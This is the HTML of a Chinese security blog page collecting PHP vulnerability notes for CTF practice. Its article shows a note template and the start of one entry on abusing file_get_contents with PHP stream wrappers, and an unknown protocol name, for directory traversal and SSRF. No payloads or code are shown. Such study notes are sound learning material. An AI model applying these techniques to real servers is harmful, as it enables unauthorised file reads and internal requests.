@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>php漏洞收录 | thunder_sword&#39;s blog</title>
+    <meta name="generator" content="VuePress 1.5.2">
+    <link rel="icon" href="/img/128_favicon.ico">
+    <script>
+	  var _hmt = _hmt || [];
+	  (function() {
+		var hm = document.createElement("script");
+		hm.src = "https://hm.baidu.com/hm.js?ab724b1142aa47464561dc21c24761ad";
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(hm, s);
+	  })();
+		</script>
+    <meta name="description" content="包括各种内容的个人博客，欢迎来玩：Linux,Shell,c++,python,java,sql,mysql,git,github，acm,ctf,学习笔记,学习,知识统计,C,Typora,Linux,Shell,c++,python,java,sql,mysql,git,github,markdown">
+    <meta name="keywords" content="网安博客,个人技术博客,网安,网络安全,计算机技术,acm,ctf,笔记,学习,知识统计,C,Typora,Linux,Shell,c++,python,java,sql,mysql,git,github,markdown">
+    <meta name="baidu-site-verification" content="code-osO2ZQEOYI">
+    <meta name="theme-color" content="#11a8cd">
+    <link rel="preload" href="/assets/css/0.styles.8e94a3bb.css" as="style"><link rel="preload" href="/assets/js/app.8ae89511.js" as="script"><link rel="preload" href="/assets/js/2.21067fc1.js" as="script"><link rel="preload" href="/assets/js/82.73bce673.js" as="script"><link rel="prefetch" href="/assets/js/10.363f5a8c.js"><link rel="prefetch" href="/assets/js/100.934b6357.js"><link rel="prefetch" href="/assets/js/101.f8b9d68d.js"><link rel="prefetch" href="/assets/js/102.6f469093.js"><link rel="prefetch" href="/assets/js/103.42df2376.js"><link rel="prefetch" href="/assets/js/104.c825a43b.js"><link rel="prefetch" href="/assets/js/105.f7e5c126.js"><link rel="prefetch" href="/assets/js/106.15dd9902.js"><link rel="prefetch" href="/assets/js/107.91f7cad2.js"><link rel="prefetch" href="/assets/js/108.d7e33b9c.js"><link rel="prefetch" href="/assets/js/109.f79876b0.js"><link rel="prefetch" href="/assets/js/11.9995c499.js"><link rel="prefetch" href="/assets/js/110.9ebbe651.js"><link rel="prefetch" href="/assets/js/111.bdf11a26.js"><link rel="prefetch" href="/assets/js/112.2a02f3fd.js"><link rel="prefetch" href="/assets/js/113.7f775613.js"><link rel="prefetch" href="/assets/js/114.5d535c27.js"><link rel="prefetch" href="/assets/js/115.bf17a257.js"><link rel="prefetch" href="/assets/js/116.67975a0a.js"><link rel="prefetch" href="/assets/js/117.29726bb8.js"><link rel="prefetch" href="/assets/js/118.85c23e6d.js"><link rel="prefetch" href="/assets/js/119.3283a11e.js"><link rel="prefetch" href="/assets/js/12.1edfdf54.js"><link rel="prefetch" href="/assets/js/120.483f9d76.js"><link rel="prefetch" href="/assets/js/121.813e3c0b.js"><link rel="prefetch" href="/assets/js/122.4dc8fed0.js"><link rel="prefetch" href="/assets/js/123.802dc3ec.js"><link rel="prefetch" href="/assets/js/124.a12287af.js"><link rel="prefetch" href="/assets/js/125.26a04a6e.js"><link rel="prefetch" href="/assets/js/126.b6a91019.js"><link rel="prefetch" href="/assets/js/127.5a5056ec.js"><link rel="prefetch" href="/assets/js/128.288a799a.js"><link rel="prefetch" href="/assets/js/129.22bc1459.js"><link rel="prefetch" href="/assets/js/13.0ec5a62e.js"><link rel="prefetch" href="/assets/js/130.9ba30ee1.js"><link rel="prefetch" href="/assets/js/131.de1af22d.js"><link rel="prefetch" href="/assets/js/132.64bc25bc.js"><link rel="prefetch" href="/assets/js/133.48aa4990.js"><link rel="prefetch" href="/assets/js/134.ca134708.js"><link rel="prefetch" href="/assets/js/135.794f784d.js"><link rel="prefetch" href="/assets/js/136.9eef975b.js"><link rel="prefetch" href="/assets/js/137.30fa4bd2.js"><link rel="prefetch" href="/assets/js/138.c84f582e.js"><link rel="prefetch" href="/assets/js/139.949d8834.js"><link rel="prefetch" href="/assets/js/14.7d10e510.js"><link rel="prefetch" href="/assets/js/140.42abba88.js"><link rel="prefetch" href="/assets/js/141.467726eb.js"><link rel="prefetch" href="/assets/js/142.b270a009.js"><link rel="prefetch" href="/assets/js/143.bfbc191d.js"><link rel="prefetch" href="/assets/js/144.6f9c9895.js"><link rel="prefetch" href="/assets/js/145.54af279c.js"><link rel="prefetch" href="/assets/js/146.4a169743.js"><link rel="prefetch" href="/assets/js/147.86d22c96.js"><link rel="prefetch" href="/assets/js/148.29a1ac45.js"><link rel="prefetch" href="/assets/js/149.8d018fe3.js"><link rel="prefetch" href="/assets/js/15.32699879.js"><link rel="prefetch" href="/assets/js/150.3e54a748.js"><link rel="prefetch" href="/assets/js/151.09d281cc.js"><link rel="prefetch" href="/assets/js/152.d931d3fe.js"><link rel="prefetch" href="/assets/js/153.169fc8c9.js"><link rel="prefetch" href="/assets/js/154.cabae2e7.js"><link rel="prefetch" href="/assets/js/155.ed0af2d9.js"><link rel="prefetch" href="/assets/js/156.7f918e5c.js"><link rel="prefetch" href="/assets/js/157.a9873d05.js"><link rel="prefetch" href="/assets/js/158.8e7b6084.js"><link rel="prefetch" href="/assets/js/159.56db345f.js"><link rel="prefetch" href="/assets/js/16.34e69334.js"><link rel="prefetch" href="/assets/js/160.10a7d3c4.js"><link rel="prefetch" href="/assets/js/161.a29b8436.js"><link rel="prefetch" href="/assets/js/162.8f9938a1.js"><link rel="prefetch" href="/assets/js/163.d78ce58e.js"><link rel="prefetch" href="/assets/js/164.13585021.js"><link rel="prefetch" href="/assets/js/165.0e65d877.js"><link rel="prefetch" href="/assets/js/166.6c61c206.js"><link rel="prefetch" href="/assets/js/167.265c4be7.js"><link rel="prefetch" href="/assets/js/168.3ced2a8a.js"><link rel="prefetch" href="/assets/js/169.cc5767c2.js"><link rel="prefetch" href="/assets/js/17.bd60ca6a.js"><link rel="prefetch" href="/assets/js/170.a2de2fff.js"><link rel="prefetch" href="/assets/js/171.c6f9171f.js"><link rel="prefetch" href="/assets/js/172.f24e9ce6.js"><link rel="prefetch" href="/assets/js/173.18b358b4.js"><link rel="prefetch" href="/assets/js/174.e35e91f7.js"><link rel="prefetch" href="/assets/js/175.0cc42772.js"><link rel="prefetch" href="/assets/js/176.af46ad6d.js"><link rel="prefetch" href="/assets/js/177.eb963933.js"><link rel="prefetch" href="/assets/js/178.720ad3b6.js"><link rel="prefetch" href="/assets/js/179.baa8681a.js"><link rel="prefetch" href="/assets/js/18.cf3ae1b2.js"><link rel="prefetch" href="/assets/js/180.7a8daf7d.js"><link rel="prefetch" href="/assets/js/181.f4de1e40.js"><link rel="prefetch" href="/assets/js/182.6877aa50.js"><link rel="prefetch" href="/assets/js/183.23cd316e.js"><link rel="prefetch" href="/assets/js/184.705e72ff.js"><link rel="prefetch" href="/assets/js/185.4f327c98.js"><link rel="prefetch" href="/assets/js/186.711aeff4.js"><link rel="prefetch" href="/assets/js/187.8eee3b6a.js"><link rel="prefetch" href="/assets/js/188.8abf0467.js"><link rel="prefetch" href="/assets/js/189.74bdb45a.js"><link rel="prefetch" href="/assets/js/19.d1adc73b.js"><link rel="prefetch" href="/assets/js/190.9e5f5833.js"><link rel="prefetch" href="/assets/js/191.e792b8b2.js"><link rel="prefetch" href="/assets/js/192.359a9f70.js"><link rel="prefetch" href="/assets/js/193.289ce1fa.js"><link rel="prefetch" href="/assets/js/194.ac5c826b.js"><link rel="prefetch" href="/assets/js/195.433b2c47.js"><link rel="prefetch" href="/assets/js/196.f03fda09.js"><link rel="prefetch" href="/assets/js/197.fb0615ca.js"><link rel="prefetch" href="/assets/js/198.6bba41f6.js"><link rel="prefetch" href="/assets/js/199.7314ee40.js"><link rel="prefetch" href="/assets/js/20.c5f73bb2.js"><link rel="prefetch" href="/assets/js/200.4395e854.js"><link rel="prefetch" href="/assets/js/201.f7415cc6.js"><link rel="prefetch" href="/assets/js/202.5848f480.js"><link rel="prefetch" href="/assets/js/203.a885bc00.js"><link rel="prefetch" href="/assets/js/204.4fd4d9e3.js"><link rel="prefetch" href="/assets/js/205.688f3fc2.js"><link rel="prefetch" href="/assets/js/206.9dbbe8ed.js"><link rel="prefetch" href="/assets/js/207.a41facb9.js"><link rel="prefetch" href="/assets/js/208.bbef2dba.js"><link rel="prefetch" href="/assets/js/209.9e11c5c1.js"><link rel="prefetch" href="/assets/js/21.ca22ea0d.js"><link rel="prefetch" href="/assets/js/210.e2192b7d.js"><link rel="prefetch" href="/assets/js/211.78c7143d.js"><link rel="prefetch" href="/assets/js/212.104a1b36.js"><link rel="prefetch" href="/assets/js/213.19a995c5.js"><link rel="prefetch" href="/assets/js/214.7690233d.js"><link rel="prefetch" href="/assets/js/215.f590fab1.js"><link rel="prefetch" href="/assets/js/216.0edbdcc7.js"><link rel="prefetch" href="/assets/js/217.3ebf3e14.js"><link rel="prefetch" href="/assets/js/218.751d48ce.js"><link rel="prefetch" href="/assets/js/219.40ebb0d5.js"><link rel="prefetch" href="/assets/js/22.637d1003.js"><link rel="prefetch" href="/assets/js/220.93cb3a86.js"><link rel="prefetch" href="/assets/js/221.471b2b60.js"><link rel="prefetch" href="/assets/js/222.a3a6af12.js"><link rel="prefetch" href="/assets/js/223.174b7578.js"><link rel="prefetch" href="/assets/js/224.cbc14f1a.js"><link rel="prefetch" href="/assets/js/225.e2223aa2.js"><link rel="prefetch" href="/assets/js/226.96936081.js"><link rel="prefetch" href="/assets/js/227.89aa85c0.js"><link rel="prefetch" href="/assets/js/228.3bbce9b9.js"><link rel="prefetch" href="/assets/js/229.1a79ca0d.js"><link rel="prefetch" href="/assets/js/23.b5543d40.js"><link rel="prefetch" href="/assets/js/230.4faf30fe.js"><link rel="prefetch" href="/assets/js/231.9248cc46.js"><link rel="prefetch" href="/assets/js/232.8ce08c14.js"><link rel="prefetch" href="/assets/js/233.f12bf250.js"><link rel="prefetch" href="/assets/js/234.4cfff092.js"><link rel="prefetch" href="/assets/js/235.709856c4.js"><link rel="prefetch" href="/assets/js/236.eb771065.js"><link rel="prefetch" href="/assets/js/237.ab7cf8aa.js"><link rel="prefetch" href="/assets/js/238.986b9ee2.js"><link rel="prefetch" href="/assets/js/239.88952669.js"><link rel="prefetch" href="/assets/js/24.9199ded5.js"><link rel="prefetch" href="/assets/js/240.1e2438a1.js"><link rel="prefetch" href="/assets/js/241.da7a083a.js"><link rel="prefetch" href="/assets/js/242.8632fe41.js"><link rel="prefetch" href="/assets/js/243.4886c8c3.js"><link rel="prefetch" href="/assets/js/244.729f06c6.js"><link rel="prefetch" href="/assets/js/245.70a603ea.js"><link rel="prefetch" href="/assets/js/246.680b96ab.js"><link rel="prefetch" href="/assets/js/247.d491476f.js"><link rel="prefetch" href="/assets/js/248.c579eee6.js"><link rel="prefetch" href="/assets/js/249.b46801b6.js"><link rel="prefetch" href="/assets/js/25.930b83bb.js"><link rel="prefetch" href="/assets/js/250.62244608.js"><link rel="prefetch" href="/assets/js/251.3001b595.js"><link rel="prefetch" href="/assets/js/252.2399b3fe.js"><link rel="prefetch" href="/assets/js/253.582f6c8d.js"><link rel="prefetch" href="/assets/js/254.0ae0e142.js"><link rel="prefetch" href="/assets/js/255.f945ca4e.js"><link rel="prefetch" href="/assets/js/256.09f4a156.js"><link rel="prefetch" href="/assets/js/257.c2439cc1.js"><link rel="prefetch" href="/assets/js/258.c0599f77.js"><link rel="prefetch" href="/assets/js/259.dddc640f.js"><link rel="prefetch" href="/assets/js/26.67a7dc9d.js"><link rel="prefetch" href="/assets/js/260.2e46e060.js"><link rel="prefetch" href="/assets/js/261.3f9a3f33.js"><link rel="prefetch" href="/assets/js/262.3c8c0e21.js"><link rel="prefetch" href="/assets/js/263.f0efe292.js"><link rel="prefetch" href="/assets/js/264.698bc2f9.js"><link rel="prefetch" href="/assets/js/265.9542aa7d.js"><link rel="prefetch" href="/assets/js/266.b029a6bb.js"><link rel="prefetch" href="/assets/js/267.e0786e9e.js"><link rel="prefetch" href="/assets/js/268.e3d735a0.js"><link rel="prefetch" href="/assets/js/269.4f97d449.js"><link rel="prefetch" href="/assets/js/27.0db05ae8.js"><link rel="prefetch" href="/assets/js/270.1d392e22.js"><link rel="prefetch" href="/assets/js/271.5dedfb50.js"><link rel="prefetch" href="/assets/js/272.919cda74.js"><link rel="prefetch" href="/assets/js/273.7a80d837.js"><link rel="prefetch" href="/assets/js/274.0c0109aa.js"><link rel="prefetch" href="/assets/js/275.ea399224.js"><link rel="prefetch" href="/assets/js/276.8987ef9c.js"><link rel="prefetch" href="/assets/js/277.4829152a.js"><link rel="prefetch" href="/assets/js/278.0458cff6.js"><link rel="prefetch" href="/assets/js/279.a9409ef9.js"><link rel="prefetch" href="/assets/js/28.793c02c9.js"><link rel="prefetch" href="/assets/js/280.0ae6b277.js"><link rel="prefetch" href="/assets/js/281.7a2ae26c.js"><link rel="prefetch" href="/assets/js/282.a5c8801f.js"><link rel="prefetch" href="/assets/js/283.d367d9ee.js"><link rel="prefetch" href="/assets/js/284.402fa38b.js"><link rel="prefetch" href="/assets/js/285.2dec3ed0.js"><link rel="prefetch" href="/assets/js/286.d322ecc0.js"><link rel="prefetch" href="/assets/js/287.f6e133a1.js"><link rel="prefetch" href="/assets/js/288.becfe424.js"><link rel="prefetch" href="/assets/js/289.de93c90b.js"><link rel="prefetch" href="/assets/js/29.254d40bd.js"><link rel="prefetch" href="/assets/js/290.d69ace3d.js"><link rel="prefetch" href="/assets/js/291.4fa2761f.js"><link rel="prefetch" href="/assets/js/292.4784f540.js"><link rel="prefetch" href="/assets/js/293.6b2449a3.js"><link rel="prefetch" href="/assets/js/294.52841b1e.js"><link rel="prefetch" href="/assets/js/295.222be7c6.js"><link rel="prefetch" href="/assets/js/296.ae121c9d.js"><link rel="prefetch" href="/assets/js/297.cb8cf829.js"><link rel="prefetch" href="/assets/js/298.33e30bc3.js"><link rel="prefetch" href="/assets/js/299.c3369187.js"><link rel="prefetch" href="/assets/js/3.91b72db1.js"><link rel="prefetch" href="/assets/js/30.8a8c762f.js"><link rel="prefetch" href="/assets/js/300.cc98a4a9.js"><link rel="prefetch" href="/assets/js/301.b9e5f072.js"><link rel="prefetch" href="/assets/js/31.9ae1e5cb.js"><link rel="prefetch" href="/assets/js/32.3ba2d373.js"><link rel="prefetch" href="/assets/js/33.5eaa2577.js"><link rel="prefetch" href="/assets/js/34.63424b98.js"><link rel="prefetch" href="/assets/js/35.4b7f8aa0.js"><link rel="prefetch" href="/assets/js/36.8e064699.js"><link rel="prefetch" href="/assets/js/37.6ae0dc07.js"><link rel="prefetch" href="/assets/js/38.3b42285e.js"><link rel="prefetch" href="/assets/js/39.d869f03d.js"><link rel="prefetch" href="/assets/js/4.f785a008.js"><link rel="prefetch" href="/assets/js/40.c2087cf1.js"><link rel="prefetch" href="/assets/js/41.83dc2601.js"><link rel="prefetch" href="/assets/js/42.26b27c67.js"><link rel="prefetch" href="/assets/js/43.1fb64021.js"><link rel="prefetch" href="/assets/js/44.47c5512c.js"><link rel="prefetch" href="/assets/js/45.a9be4fba.js"><link rel="prefetch" href="/assets/js/46.b90155b4.js"><link rel="prefetch" href="/assets/js/47.683c0045.js"><link rel="prefetch" href="/assets/js/48.9d4ee34c.js"><link rel="prefetch" href="/assets/js/49.d1c353cb.js"><link rel="prefetch" href="/assets/js/5.820b15f8.js"><link rel="prefetch" href="/assets/js/50.9b5c1487.js"><link rel="prefetch" href="/assets/js/51.792098bd.js"><link rel="prefetch" href="/assets/js/52.e31a33b1.js"><link rel="prefetch" href="/assets/js/53.519ca970.js"><link rel="prefetch" href="/assets/js/54.f301fe0f.js"><link rel="prefetch" href="/assets/js/55.c374419d.js"><link rel="prefetch" href="/assets/js/56.64495cf6.js"><link rel="prefetch" href="/assets/js/57.55f67b84.js"><link rel="prefetch" href="/assets/js/58.c8f61071.js"><link rel="prefetch" href="/assets/js/59.99ebbccb.js"><link rel="prefetch" href="/assets/js/6.67a8567f.js"><link rel="prefetch" href="/assets/js/60.1c8aa90f.js"><link rel="prefetch" href="/assets/js/61.d8eb1153.js"><link rel="prefetch" href="/assets/js/62.19fa408b.js"><link rel="prefetch" href="/assets/js/63.c34cc36f.js"><link rel="prefetch" href="/assets/js/64.9971e57b.js"><link rel="prefetch" href="/assets/js/65.d8115891.js"><link rel="prefetch" href="/assets/js/66.5460bceb.js"><link rel="prefetch" href="/assets/js/67.2c2a5107.js"><link rel="prefetch" href="/assets/js/68.d314bf72.js"><link rel="prefetch" href="/assets/js/69.a37789c1.js"><link rel="prefetch" href="/assets/js/7.fb2d5dd3.js"><link rel="prefetch" href="/assets/js/70.7b58f118.js"><link rel="prefetch" href="/assets/js/71.501f9043.js"><link rel="prefetch" href="/assets/js/72.a30b812a.js"><link rel="prefetch" href="/assets/js/73.53d017b7.js"><link rel="prefetch" href="/assets/js/74.8136ba15.js"><link rel="prefetch" href="/assets/js/75.bb5b9fdb.js"><link rel="prefetch" href="/assets/js/76.5c920b0b.js"><link rel="prefetch" href="/assets/js/77.7f75e39b.js"><link rel="prefetch" href="/assets/js/78.e4825541.js"><link rel="prefetch" href="/assets/js/79.87d0ca53.js"><link rel="prefetch" href="/assets/js/8.af10e837.js"><link rel="prefetch" href="/assets/js/80.1b4deab7.js"><link rel="prefetch" href="/assets/js/81.f56c09f9.js"><link rel="prefetch" href="/assets/js/83.49b53a69.js"><link rel="prefetch" href="/assets/js/84.615f2a03.js"><link rel="prefetch" href="/assets/js/85.9be0b2a4.js"><link rel="prefetch" href="/assets/js/86.24d7295e.js"><link rel="prefetch" href="/assets/js/87.6785e70d.js"><link rel="prefetch" href="/assets/js/88.f4b74491.js"><link rel="prefetch" href="/assets/js/89.766c0fc5.js"><link rel="prefetch" href="/assets/js/9.bcc9507a.js"><link rel="prefetch" href="/assets/js/90.166b22df.js"><link rel="prefetch" href="/assets/js/91.c8c47609.js"><link rel="prefetch" href="/assets/js/92.08987e99.js"><link rel="prefetch" href="/assets/js/93.74981456.js"><link rel="prefetch" href="/assets/js/94.f350100d.js"><link rel="prefetch" href="/assets/js/95.fa1165c6.js"><link rel="prefetch" href="/assets/js/96.791c8444.js"><link rel="prefetch" href="/assets/js/97.1f759edf.js"><link rel="prefetch" href="/assets/js/98.d1ffe66f.js"><link rel="prefetch" href="/assets/js/99.e761c232.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.8e94a3bb.css">
+  </head>
+  <body class="theme-mode-light">
+    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-body-img"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/ths-logo.png" alt="thunder_sword's blog" class="logo"> <span class="site-name can-hide">thunder_sword's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="http://ithundersword.gitee.io/blogimages/images/life/index.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  来看漫画丫~
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/categories/" class="nav-link">分类</a></div><div class="nav-item"><a href="/tags/" class="nav-link">标签</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div> <a href="https://github.com/thunder-sword/thunder-sword.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
+    GitHub
+    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="/img/touxiang.jpg"> <div class="blogger-info"><h3>thunder-sword</h3> <span>网安界的小菜鸡</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="http://ithundersword.gitee.io/blogimages/images/life/index.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  来看漫画丫~
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/categories/" class="nav-link">分类</a></div><div class="nav-item"><a href="/tags/" class="nav-link">标签</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div> <a href="https://github.com/thunder-sword/thunder-sword.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
+    GitHub
+    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>md5</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>php漏洞</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/a1a80e/" class="sidebar-link">phpMyadmin漏洞</a></li><li><a href="/pages/1b65d0/" class="sidebar-link">php伪协议实现命令执行的七种姿势</a></li><li><a href="/pages/39e972/" aria-current="page" class="active sidebar-link">php漏洞收录</a></li><li><a href="/pages/791941/" class="sidebar-link">利用_phar_拓展_php_反序列化漏洞攻击面</a></li><li><a href="/pages/a44cb6/" class="sidebar-link">谈一谈phpfilter的妙用</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>python漏洞</span> <span class="arrow right"></span></p> <!----></section></li><li><a href="/pages/476de1/" class="sidebar-link">url地址栏运行代码方法</a></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>webshell</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>web基础</span> <span class="arrow right"></span></p> <!----></section></li><li><a href="/pages/bfdd85/" class="sidebar-link">基础知识</a></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>序列化反序列化</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>文件包含漏洞File_Inclusion</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>正则表达式</span> <span class="arrow right"></span></p> <!----></section></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- 正方形 -->
+      <ins class="adsbygoogle"
+          style="display:block"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="3508773082"
+          data-ad-format="auto"
+          data-full-width-responsive="true"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-33863c7e><div class="articleInfo" data-v-33863c7e><ul class="breadcrumbs" data-v-33863c7e><li data-v-33863c7e><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-33863c7e></a></li> <li data-v-33863c7e><a href="/categories/?category=Web" title="分类" data-v-33863c7e>Web</a></li> <li data-v-33863c7e><a href="/categories/?category=php%E6%BC%8F%E6%B4%9E" title="分类" data-v-33863c7e>php漏洞</a></li> <!----></ul> <div class="info" data-v-33863c7e><div title="作者" class="author iconfont icon-touxiang" data-v-33863c7e><a href="https://github.com/thunder-sword" target="_blank" title="作者" class="beLink" data-v-33863c7e>thunder-sword</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-33863c7e><a href="javascript:;" data-v-33863c7e>2021-01-19</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><!----> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">
+          php漏洞收录
+        </h1> <div class="page-slot page-slot-top"><!-- 固定100% * 90px可显示，max-height:90px未见显示-->
+     <ins class="adsbygoogle"
+          style="display:inline-block;width:100%;max-height:90px"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="6625304284"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script></div> <div class="theme-vdoing-content content__default"><p><s><s>模板</s></s>
+说明：
+类目：
+考点：
+漏洞函数：
+漏洞：
+注意要点：
+题目限制：
+绕过方式：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>
+
+说明：file_get_contents文件包含使用时，php伪协议可直接使用；file_get_contents访问任意目录文件，绕过文件名要求
+类目：easy_ssrf(服务端请求伪造攻击（Server-side Request Forgery）)、文件包含
+考点：file_get_contents使用不存在的协议名导致目录穿越，实现SSRF
+漏洞函数：file_get_contents
